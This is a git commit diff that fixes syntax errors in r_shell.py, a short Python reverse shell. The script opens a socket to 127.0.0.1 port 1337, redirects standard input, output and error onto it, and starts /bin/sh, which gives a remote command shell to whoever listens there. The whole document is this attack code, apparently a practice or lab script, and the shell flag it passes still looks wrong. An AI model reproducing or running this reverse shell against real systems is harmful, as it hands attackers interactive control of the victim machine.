e9e64fcb1f8208c3128d06828a9e169885081cfd
ErickO <eocalampa@gmail.com>
2020-11-04 12:32:41 -0500

    Update r_shell.py

--- r_shell.py
+++ r_shell.py
@@ -1,12 +1,14 @@
-import socket, subprocess, os;
+                         
+import os
+import subprocess
+import socket
 
-host='127.0.0.1',
-port=1337
-s=socket.socket(socket.AF_INET, socket.SOCKET_STREAM)
-s.connect(target)
+target = ("127.0.0.1",1337)
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(target)
 
-os.dup2(s.fileno(), 0)
-os.dup2(s.fileno(), 1)
-os.dup2(s.fileno(), 2)
+os.dup2(sock.fileno(), 0)
+os.dup2(sock.fileno(), 1)
+os.dup2(sock.fileno(), 2)
 
-subprocess.call(['/bin/sh','-1']
+subprocess.call(["/bin/sh", "-1"])
